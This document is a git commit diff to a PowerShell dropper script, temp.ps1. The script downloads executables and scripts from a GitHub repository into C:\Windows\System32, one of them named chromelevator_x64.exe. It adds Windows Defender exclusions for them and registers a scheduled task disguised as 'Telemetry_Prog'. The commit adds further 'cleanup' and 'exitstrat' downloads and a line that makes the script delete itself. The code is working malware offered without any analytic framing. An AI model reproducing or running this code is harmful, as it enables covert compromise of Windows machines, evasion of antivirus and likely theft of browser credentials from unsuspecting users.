8e8de9a6207dad6352bf1455afc57de5eecf4648
Kylerainer09 <Mr.nobodyAl22SU@proton.me>
2025-11-29 05:58:59 +0000

    Update temp.ps1

--- temp.ps1
+++ temp.ps1
@@ -2,6 +2,8 @@
 Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/N0b0dy.exe' -OutFile "C:\Windows\System32\N0b0dy.exe"
 Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/ddrcc.ps1' -OutFile "C:\Windows\System32\ddrcc.ps1"
 Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/chromelevator_x64.exe' -OutFile "C:\Windows\System32\chromelevator_x64.exe"
+Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/cleanup1.ps1' -OutFile "C:\Windows\System32\cleanup.ps1"
+Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/cleanup2.ps1' -OutFile "C:\Windows\System32\exitstrat.ps1"
 # add exlusion to files
 Add-MpPreference -ExclusionPath "C:\Windows\System32\N0b0dy.exe"
 Add-MpPreference -ExclusionPath "C:\Windows\System32\chromelevator_x64.exe"
@@ -18,4 +20,5 @@ Register-ScheduledTask -TaskName "Telemetry_Prog" -Action $action -Trigger $trig
 & "C:\Windows\System32\ddrcc.ps1"
 # re-enable real time protection
 Set-MpPreference -DisableRealtimeMonitoring $false
+Remove-Item -Path $MyInvocation.MyCommand.Source -Force
 
